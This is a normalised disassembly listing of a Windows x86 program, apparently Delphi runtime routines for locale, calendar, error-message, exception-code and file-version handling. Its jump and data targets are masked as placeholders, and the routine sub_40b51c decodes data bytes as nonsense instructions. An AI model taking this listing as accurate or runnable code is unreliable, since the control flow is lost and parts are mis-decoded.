mov [ esp + 0x4 ] 0x0
sub_40aa3c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a848
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404138
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aa70
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a504
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40aa3c
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404138
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a848
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aafc
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403f68
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ab48
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ecc
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403f68
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ab94
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40abbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ab48
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405978
sub_40abf8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ad0b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40abbc
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ecc
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40abbc
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ecc
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40abbc
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ecc
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40abbc
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ecc
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad12
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403e9c
retn
sub_40ad1c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ad58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40adbd
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404070
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407f04
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40adc4
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
inc ebx
sub_40add0
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40ae67
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ab48
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407f04
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae6e
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ad1c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ad58
call EnumCalendarInfoA
sub_40ae80
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b04a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403e78
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ab48
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407f04
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404138
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b051
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403e9c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4084fc
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bef0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404398
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404140
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ecc
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4084fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404140
inc ebx
jmp r-xdata
mov eax esi
call sub_404138
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4084fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404140
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404140
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404140
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404060
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404140
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404060
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404140
sub_40b0b4
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b0a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c0cc
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408420
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ee4
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403078
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408a44
mov eax [ ebp - 0x4 ]
call sub_4083bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404338
mov ebx eax
mov eax ebx
call sub_4083bc
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b23c
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b0b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_404ee4
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_40298c
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4083bc
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b304
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ecc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b340
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b39a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408a84
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3a1
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
add esp 0xfffffff0
call sub_40344c
sub_40b3a1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b3c0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405978
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b3fc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b468
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405978
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408a84
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b46f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
add esp 0xfffffff0
call sub_40344c
sub_40b46f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4bc
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
sub_40b51c
and [ ebp + 0xa0e0040 ] dh
push esp
inc ebp
js r-xdata
cmp edi 0xffffffff
pop ebx
retn
jo r-xdata
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b62c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f10
jmp r-xdata
push ebx
mov eax edx
jmp sub_4038b4
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b633
lea eax [ ebp - 0x20 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b304
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b4bc
mov edx eax
sub_40b590
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b62c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f10
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b633
lea eax [ ebp - 0x20 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40b680
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b718
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b8d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4040e8
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40828c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b8da
lea eax [ ebp - 0x170 ]
call sub_403e78
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40b8e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40b99f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b680
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b304
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push ebp
call sub_40b718
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9a6
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
mov ebx eax
sub_40b9c0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40b9b0
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b700
mov eax [ rw-data ]
mov [ eax ] sub_40b8e4
mov eax sub_40b64c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b668
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40ba44
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
sub_40bac4
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4040e8
sub_40bb54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bc2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f10
lea eax [ ebp - 0x8 ]
call j_sub_404344#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404338
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc31
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bc0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404338
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bc40
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bcb8
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404338
mov edx esi
dec edx
call sub_40bc40
sub_40bcf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404138
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bd1c
pop esi
pop ebx
retn
mov eax ebx
call sub_404138
mov esi eax
sub_40bd1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404138
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40bf2c
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40bd74
push ebp
